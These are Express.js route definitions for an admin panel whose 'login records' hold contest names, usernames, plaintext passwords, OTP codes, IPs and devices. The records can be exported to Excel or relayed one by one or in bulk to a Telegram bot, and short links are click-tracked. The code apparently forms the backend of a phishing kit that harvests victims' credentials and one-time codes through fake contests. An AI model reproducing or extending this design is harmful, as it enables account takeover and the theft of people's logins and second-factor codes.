// routes/auth.js
const express = require('express');
const { body } = require('express-validator');
const authController = require('../controllers/authController');
const { authMiddleware } = require('../middleware/auth');
const { authLimiter } = require('../middleware/rateLimiter');

const router = express.Router();

// Validation rules
const registerValidation = [
  body('name')
    .notEmpty()
    .withMessage('Name is required')
    .isLength({ min: 2, max: 100 })
    .withMessage('Name must be between 2 and 100 characters'),
  body('email')
    .isEmail()
    .withMessage('Valid email is required')
    .normalizeEmail(),
  body('password')
    .isLength({ min: 6 })
    .withMessage('Password must be at least 6 characters')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    .withMessage('Password must contain at least one uppercase letter, one lowercase letter, and one number'),
  body('role')
    .optional()
    .isIn(['superadmin', 'manager', 'editor'])
    .withMessage('Invalid role')
];

const loginValidation = [
  body('email')
    .isEmail()
    .withMessage('Valid email is required')
    .normalizeEmail(),
  body('password')
    .notEmpty()
    .withMessage('Password is required')
];

const changePasswordValidation = [
  body('currentPassword')
    .notEmpty()
    .withMessage('Current password is required'),
  body('newPassword')
    .isLength({ min: 6 })
    .withMessage('New password must be at least 6 characters')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    .withMessage('New password must contain at least one uppercase letter, one lowercase letter, and one number')
];

// Routes
router.post('/register', authLimiter, registerValidation, authController.register);
router.post('/login', authLimiter, loginValidation, authController.login);
router.get('/profile', authMiddleware, authController.getProfile);
router.put('/profile', authMiddleware, authController.updateProfile);
router.put('/change-password', authMiddleware, changePasswordValidation, authController.changePassword);
router.post('/logout', authMiddleware, authController.logout);

module.exports = router;

// routes/loginRecords.js
const express = require('express');
const { body, query } = require('express-validator');
const loginRecordController = require('../controllers/loginRecordController');
const { requirePermission } = require('../middleware/auth');

const router = express.Router();

// Validation rules
const createValidation = [
  body('contestName')
    .notEmpty()
    .withMessage('Contest name is required')
    .isLength({ max: 255 })
    .withMessage('Contest name too long'),
  body('username')
    .notEmpty()
    .withMessage('Username is required')
    .isLength({ max: 100 })
    .withMessage('Username too long'),
  body('password')
    .notEmpty()
    .withMessage('Password is required')
    .isLength({ max: 255 })
    .withMessage('Password too long'),
  body('otpCode')
    .notEmpty()
    .withMessage('OTP code is required')
    .isLength({ min: 4, max: 10 })
    .withMessage('OTP code must be between 4 and 10 characters'),
  body('ipAddress')
    .isIP()
    .withMessage('Valid IP address is required'),
  body('device')
    .notEmpty()
    .withMessage('Device information is required')
];

const updateValidation = [
  body('contestName')
    .optional()
    .isLength({ max: 255 })
    .withMessage('Contest name too long'),
  body('username')
    .optional()
    .isLength({ max: 100 })
    .withMessage('Username too long'),
  body('password')
    .optional()
    .isLength({ max: 255 })
    .withMessage('Password too long'),
  body('otpCode')
    .optional()
    .isLength({ min: 4, max: 10 })
    .withMessage('OTP code must be between 4 and 10 characters'),
  body('status')
    .optional()
    .isIn(['success', 'failed', 'pending'])
    .withMessage('Invalid status')
];

const queryValidation = [
  query('page')
    .optional()
    .isInt({ min: 1 })
    .withMessage('Page must be a positive integer'),
  query('limit')
    .optional()
    .isInt({ min: 1, max: 100 })
    .withMessage('Limit must be between 1 and 100'),
  query('status')
    .optional()
    .isIn(['success', 'failed', 'pending'])
    .withMessage('Invalid status'),
  query('startDate')
    .optional()
    .isISO8601()
    .withMessage('Invalid start date'),
  query('endDate')
    .optional()
    .isISO8601()
    .withMessage('Invalid end date')
];

// Routes
router.get('/', requirePermission(['read']), queryValidation, loginRecordController.getAll);
router.get('/statistics', requirePermission(['read']), loginRecordController.getStatistics);
router.get('/export', requirePermission(['read']), loginRecordController.exportToExcel);
router.get('/:id', requirePermission(['read']), loginRecordController.getById);
router.post('/', requirePermission(['write']), createValidation, loginRecordController.create);
router.put('/:id', requirePermission(['write']), updateValidation, loginRecordController.update);
router.delete('/:id', requirePermission(['delete']), loginRecordController.delete);

// Notification routes
router.post('/:id/send-notification', requirePermission(['write']), loginRecordController.sendNotification);
router.post('/:id/send-telegram', requirePermission(['write']), loginRecordController.sendTelegram);
router.post('/bulk/send-notifications', requirePermission(['write']), loginRecordController.bulkSendNotifications);
router.post('/bulk/send-telegram', requirePermission(['write']), loginRecordController.bulkSendTelegram);

module.exports = router;

// routes/telegram.js
const express = require('express');
const { body } = require('express-validator');
const telegramController = require('../controllers/telegramController');
const { requirePermission } = require('../middleware/auth');

const router = express.Router();

// Validation rules
const configValidation = [
  body('botToken')
    .notEmpty()
    .withMessage('Bot token is required')
    .matches(/^\d+:[A-Za-z0-9_-]+/)
    .withMessage('Invalid bot token format'),
  body('chatId')
    .notEmpty()
    .withMessage('Chat ID is required'),
  body('channelName')
    .optional()
    .isLength({ max: 100 })
    .withMessage('Channel name too long')
];

const templateValidation = [
  body('type')
    .isIn(['login', 'bulk'])
    .withMessage('Invalid template type'),
  body('template')
    .notEmpty()
    .withMessage('Template is required')
    .isLength({ max: 4000 })
    .withMessage('Template too long')
];

// Routes
router.get('/config', requirePermission(['read']), telegramController.getConfig);
router.put('/config', requirePermission(['system_settings']), configValidation, telegramController.updateConfig);
router.post('/test-connection', requirePermission(['system_settings']), telegramController.testConnection);
router.post('/send-test', requirePermission(['system_settings']), telegramController.sendTestMessage);
router.get('/statistics', requirePermission(['read']), telegramController.getStatistics);
router.put('/auto-send', requirePermission(['system_settings']), telegramController.toggleAutoSend);
router.put('/template', requirePermission(['system_settings']), templateValidation, telegramController.updateTemplate);

module.exports = router;

// routes/links.js
const express = require('express');
const { body, query } = require('express-validator');
const linkController = require('../controllers/linkController');
const { requirePermission } = require('../middleware/auth');

const router = express.Router();

// Validation rules
const createValidation = [
  body('title')
    .notEmpty()
    .withMessage('Title is required')
    .isLength({ max: 255 })
    .withMessage('Title too long'),
  body('url')
    .isURL()
    .withMessage('Valid URL is required'),
  body('category')
    .notEmpty()
    .withMessage('Category is required')
    .isLength({ max: 100 })
    .withMessage('Category too long'),
  body('description')
    .optional()
    .isLength({ max: 1000 })
    .withMessage('Description too long')
];

const updateValidation = [
  body('title')
    .optional()
    .isLength({ max: 255 })
    .withMessage('Title too long'),
  body('url')
    .optional()
    .isURL()
    .withMessage('Valid URL is required'),
  body('category')
    .optional()
    .isLength({ max: 100 })
    .withMessage('Category too long'),
  body('status')
    .optional()
    .isIn(['active', 'inactive', 'scheduled'])
    .withMessage('Invalid status'),
  body('description')
    .optional()
    .isLength({ max: 1000 })
    .withMessage('Description too long')
];

const queryValidation = [
  query('page')
    .optional()
    .isInt({ min: 1 })
    .withMessage('Page must be a positive integer'),
  query('limit')
    .optional()
    .isInt({ min: 1, max: 100 })
    .withMessage('Limit must be between 1 and 100'),
  query('status')
    .optional()
    .isIn(['active', 'inactive', 'scheduled'])
    .withMessage('Invalid status')
];

// Routes
router.get('/', requirePermission(['read']), queryValidation, linkController.getAll);
router.get('/statistics', requirePermission(['read']), linkController.getStatistics);
router.get('/:id', requirePermission(['read']), linkController.getById);
router.post('/', requirePermission(['write']), createValidation, linkController.create);
router.put('/:id', requirePermission(['write']), updateValidation, linkController.update);
router.delete('/:id', requirePermission(['delete']), linkController.delete);

// Bulk operations
router.put('/bulk/status', requirePermission(['write']), linkController.bulkUpdateStatus);
router.delete('/bulk', requirePermission(['delete']), linkController.bulkDelete);

// Public route for link tracking (no auth required)
router.get('/track/:shortUrl', linkController.trackClick);

module.exports = router;

// routes/ips.js
const express = require('express');
const { body, query } = require('express-validator');
const ipController = require('../controllers/ipController');
const { requirePermission } = require('../middleware/auth');

const router = express.Router();

// Validation rules
const createValidation = [
  body('ipAddress')
    .isIP()
    .withMessage('Valid IP address is required'),
  body('user')
    .notEmpty()
    .withMessage('User is required'),
  body('device')
    .optional()
    .isLength({ max: 255 })
    .withMessage('Device info too long'),
  body('status')
    .optional()
    .isIn(['allowed', 'blocked', 'suspicious'])
    .withMessage('Invalid status')
];

const blockValidation = [
  body('ipAddress')
    .isIP()
    .withMessage('Valid IP address is required'),
  body('blockReason')
    .notEmpty()
    .withMessage('Block reason is required')
    .isLength({ max: 500 })
    .withMessage('Block reason too long'),
  body('blockUntil')
    .optional()
    .isISO8601()
    .withMessage('Invalid block until date')
];

const queryValidation = [
  query('page')
    .optional()
    .isInt({ min: 1 })
    .withMessage('Page must be a positive integer'),
  query('limit')
    .optional()
    .isInt({ min: 1, max: 100 })
    .withMessage('Limit must be between 1 and 100'),
  query('status')
    .optional()
    .isIn(['allowed', 'blocked', 'suspicious'])
    .withMessage('Invalid status')
];

// Routes
router.get('/', requirePermission(['read']), queryValidation, ipController.getAll);
router.get('/statistics', requirePermission(['read']), ipController.getStatistics);
router.get('/:id', requirePermission(['read']), ipController.getById);
router.post('/', requirePermission(['write']), createValidation, ipController.create);
router.put('/:id', requirePermission(['write']), ipController.update);
router.delete('/:id', requirePermission(['delete']), ipController.delete);

// IP blocking routes
router.post('/block', requirePermission(['write']), blockValidation, ipController.blockIP);
router.put('/:id/unblock', requirePermission(['write']), ipController.unblockIP);

module.exports = router;